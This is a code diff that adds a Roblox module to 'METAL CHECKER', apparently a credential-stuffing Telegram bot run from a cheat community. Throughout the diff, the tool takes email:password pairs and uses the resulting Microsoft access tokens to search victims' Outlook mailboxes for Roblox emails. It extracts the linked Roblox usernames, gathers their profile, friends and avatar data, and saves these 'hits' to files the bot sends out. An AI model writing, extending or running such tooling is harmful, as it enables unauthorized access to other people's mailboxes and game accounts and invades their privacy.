@@ -1,6 +1,6 @@
 # ==============================================================================
 # METAL CHECKER v3.0 - THE ULTIMATE TELEGRAM BOT EDITION
-# Coded by: Chester Lua
+# Coded by: @vantrexXxx
 # Supported by: Metal Drops & Icardi
 # Discord: discord.gg/cheatglobal
 # ==============================================================================
@@ -304,6 +304,112 @@ class UnifiedChecker:
             return {"minecraft_status": "FREE", "minecraft_username": None}
         except: return {"minecraft_status": "ERROR", "minecraft_username": None}
 
+    # ==========================================
+    # ROBLOX ALTYAPISI (DOKUNULMADAN EKLENDİ)
+    # ==========================================
+    def GIDD(self, username):
+        url = "https://users.roblox.com/v1/usernames/users"
+        payload = {"usernames": [username], "excludeBannedUsers": False}
+        try:
+            r = requests.post(url, json=payload, timeout=10)
+            if r.status_code == 200 and r.json().get("data"):
+                return r.json()["data"][0]["id"]
+        except: pass
+        return None
+
+    def CSRFFF(self):
+        url = "https://catalog.roblox.com/v1/catalog/items/details"
+        try:
+            r = requests.post(url, json={"items":[]}, timeout=10)
+            return r.headers.get("x-csrf-token")
+        except: return None
+
+    def GSNN(self, asset_ids):
+        if not asset_ids: return []
+        token = self.CSRFFF()
+        if not token: return []
+        url = "https://catalog.roblox.com/v1/catalog/items/details"
+        items = [{"itemType": "Asset", "id": int(aid)} for aid in asset_ids]
+        headers = {"x-csrf-token": token}
+        try:
+            r = requests.post(url, json={"items": items}, headers=headers, timeout=10)
+            if r.status_code == 200:
+                return [item.get("name", "Unknown Item") for item in r.json().get("data", [])]
+        except: pass
+        return []
+
+    def ERUU(self, search_text):
+        patterns = [
+            r'account:\s*([a-zA-Z0-9_]+)',
+            r'for\s+([a-zA-Z0-9_]+)\s+and\s+want',
+            r'account:\s*([a-zA-Z0-9_]+)\.',
+            r'for\s+([a-zA-Z0-9_]+)\.\s+If'
+        ]
+        for pattern in patterns:
+            match = re.search(pattern, search_text, re.IGNORECASE)
+            if match: return match.group(1)
+        return None
+
+    def RLLL(self, username):
+        result = {"username": username, "friends": 0, "banned": "No", "created": "Unknown", "profile": "", "wearing": []}
+        user_id = self.GIDD(username)
+        if not user_id: return None
+        try:
+            user_url = f"https://users.roblox.com/v1/users/{user_id}"
+            user_res = requests.get(user_url, timeout=10)
+            user_data = user_res.json()
+            result["banned"] = "Yes" if user_data.get("isBanned", False) else "No"
+            created_raw = user_data.get("created", "")
+            result["created"] = created_raw.split("T")[0] if created_raw else "Unknown"
+            
+            friends_url = f"https://friends.roblox.com/v1/users/{user_id}/friends/count"
+            friends_res = requests.get(friends_url, timeout=10)
+            if friends_res.status_code == 200: result["friends"] = friends_res.json().get("count", 0)
+            
+            result["profile"] = f"https://www.roblox.com/users/{user_id}/profile"
+            
+            wearing_url = f"https://avatar.roblox.com/v1/users/{user_id}/currently-wearing"
+            wearing_res = requests.get(wearing_url, timeout=10)
+            if wearing_res.status_code == 200:
+                asset_ids = wearing_res.json().get("assetIds", [])
+                result["wearing"] = self.GSNN(asset_ids)
+        except: return None
+        return result
+
+    def check_roblox(self, email, access_token, cid):
+        try:
+            search_url = "https://outlook.live.com/search/api/v2/query"
+            payload = {
+                "Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "TimeZone": "UTC", "TextDecorations": "Off",
+                "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]}, "From": 0, "Query": {"QueryString": "no-reply@roblox.com"}, "Size": 25, "Sort": [{"Field": "Time", "SortDirection": "Desc"}]}]
+            }
+            headers = {'User-Agent': 'Outlook-Android/2.0', 'Accept': 'application/json', 'Authorization': f'Bearer {access_token}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json'}
+            r = self.session.post(search_url, json=payload, headers=headers, timeout=15)
+            if r.status_code == 200:
+                data = r.json()
+                if 'EntitySets' in data and len(data['EntitySets']) > 0:
+                    entity_set = data['EntitySets'][0]
+                    if 'ResultSets' in entity_set and len(entity_set['ResultSets']) > 0:
+                        result_set = entity_set['ResultSets'][0]
+                        if result_set.get('Total', 0) > 0 and 'Results' in result_set:
+                            full_text = ""
+                            for result in result_set['Results']:
+                                if 'Preview' in result:
+                                    full_text += result.get('ItemBody', {}).get('Content', result['Preview']) + " "
+                            
+                            roblox_user = self.ERUU(full_text)
+                            if roblox_user:
+                                roblox_data = self.RLLL(roblox_user)
+                                if roblox_data:
+                                    return {"roblox_status": "LINKED", "data": roblox_data}
+                                else:
+                                    return {"roblox_status": "LINKED", "data": {"username": roblox_user, "friends": 0, "banned": "Unknown", "created": "Unknown", "profile": "", "wearing": []}}
+            return {"roblox_status": "FREE", "data": {}}
+        except: return {"roblox_status": "ERROR", "data": {}}
+
+    # ==========================================
+    # ANA CHECK DONGUSU
+    # ==========================================
     def check(self, email, password):
         try:
             url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
@@ -372,6 +478,9 @@ class UnifiedChecker:
             if self.check_mode in ["minecraft", "both"]:
                 mc_res = self.check_minecraft(email, access_token, cid)
                 result.update({"minecraft_username": mc_res.get("minecraft_username")})
+            if self.check_mode in ["roblox", "both"]:
+                rbx_res = self.check_roblox(email, access_token, cid)
+                result.update({"roblox_status": rbx_res.get("roblox_status", "FREE"), "roblox_data": rbx_res.get("data", {})})
                 
             return result
         except requests.exceptions.Timeout: return {"status": "TIMEOUT"}
@@ -401,6 +510,7 @@ class ResultManager:
         self.supercell_file = os.path.join(self.base_folder, "supercell_hits.txt")
         self.tiktok_file = os.path.join(self.base_folder, "tiktok_hits.txt")
         self.minecraft_file = os.path.join(self.base_folder, "minecraft_hits.txt")
+        self.roblox_file = os.path.join(self.base_folder, "roblox_hits.txt")
         
     def save_hit(self, res):
         email, password = res['email'], res['password']
@@ -439,6 +549,13 @@ class ResultManager:
         if self.mode in ["minecraft", "both"] and res.get("minecraft_username"):
             with open(self.minecraft_file, 'a', encoding='utf-8') as f:
                 f.write(f"{base_str} | Username: {res['minecraft_username']}\n")
+                
+        if self.mode in ["roblox", "both"] and res.get("roblox_status") == "LINKED":
+            rbx = res.get("roblox_data", {})
+            wearing_str = ", ".join(rbx.get("wearing", []))
+            line = f"{base_str} | Username = {rbx.get('username')} | Friends = {rbx.get('friends')} | Banned = {rbx.get('banned')} | Created = {rbx.get('created')} | Profile = {rbx.get('profile')} | Wearing = [{wearing_str}]"
+            with open(self.roblox_file, 'a', encoding='utf-8') as f:
+                f.write(line + "\n")
 
     def save_2fa(self, email, password):
         with open(self.two_fa_file, 'a', encoding='utf-8') as f:
@@ -460,6 +577,7 @@ class ResultManager:
             elif self.mode == "supercell" and os.path.exists(self.supercell_file): files_to_send.append(self.supercell_file)
             elif self.mode == "tiktok" and os.path.exists(self.tiktok_file): files_to_send.append(self.tiktok_file)
             elif self.mode == "minecraft" and os.path.exists(self.minecraft_file): files_to_send.append(self.minecraft_file)
+            elif self.mode == "roblox" and os.path.exists(self.roblox_file): files_to_send.append(self.roblox_file)
             
             # Her halükarda hits.txt de gönderelim bulamazsa
             if not files_to_send and os.path.exists(self.hits_file):
@@ -488,9 +606,11 @@ class LiveStats:
         self.sc_hits = 0
         self.mc_hits = 0
         self.tk_hits = 0
+        self.rbx_hits = 0
         
-        self.latest_active_subs = deque(maxlen=3) # Son bulunan 3 abonelik ismini tutar
+        self.latest_active_subs = deque(maxlen=3)
         self.latest_games = deque(maxlen=3)
+        self.latest_roblox = deque(maxlen=3)
         
         self.start_time = time.time()
         self.lock = Lock()
@@ -519,6 +639,9 @@ class LiveStats:
                     if res.get("supercell_games"): self.sc_hits += 1
                     if res.get("tiktok_username"): self.tk_hits += 1
                     if res.get("minecraft_username"): self.mc_hits += 1
+                    if res.get("roblox_status") == "LINKED":
+                        self.rbx_hits += 1
+                        self.latest_roblox.append(res.get("roblox_data", {}).get("username", "Unknown"))
             elif status == "2FA": self.two_fa += 1
             else: self.bads += 1
 
@@ -549,10 +672,14 @@ class LiveStats:
                     text += f"🕹️ *Latest Games:* `{', '.join(list(self.latest_games))}`\n"
                 text += f"━━━━━━━━━━━━━━━━━━━━\n"
                 
-            if self.mode in ["supercell", "tiktok", "minecraft", "both"]:
+            if self.mode in ["supercell", "tiktok", "minecraft", "roblox", "both"]:
                 if self.mode in ["supercell", "both"]: text += f"⚔️ *Supercell:* `{self.sc_hits}`\n"
                 if self.mode in ["tiktok", "both"]: text += f"📱 *TikTok:* `{self.tk_hits}`\n"
                 if self.mode in ["minecraft", "both"]: text += f"⛏️ *Minecraft:* `{self.mc_hits}`\n"
+                if self.mode in ["roblox", "both"]: 
+                    text += f"🟥 *Roblox:* `{self.rbx_hits}`\n"
+                    if self.latest_roblox:
+                        text += f"👤 *Latest Users:* `{', '.join(list(self.latest_roblox))}`\n"
                 text += f"━━━━━━━━━━━━━━━━━━━━\n"
                 
             text += f"📊 *Progress:* `{self.checked}/{self.total} ({progress:.1f}%)`\n"
@@ -602,7 +729,8 @@ def callback_handler(call):
             InlineKeyboardButton("4. Supercell", callback_data="srv_supercell"),
             InlineKeyboardButton("5. TikTok", callback_data="srv_tiktok"),
             InlineKeyboardButton("6. Minecraft", callback_data="srv_minecraft"),
-            InlineKeyboardButton("7. Full Scan (.ZIP)", callback_data="srv_both")
+            InlineKeyboardButton("7. Full Scan (.ZIP)", callback_data="srv_both"),
+            InlineKeyboardButton("8. Roblox", callback_data="srv_roblox")
         )
         bot.edit_message_text("🎯 *SERVICE SELECTION*\nHangi servisleri vurmak istersin?", chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)
         
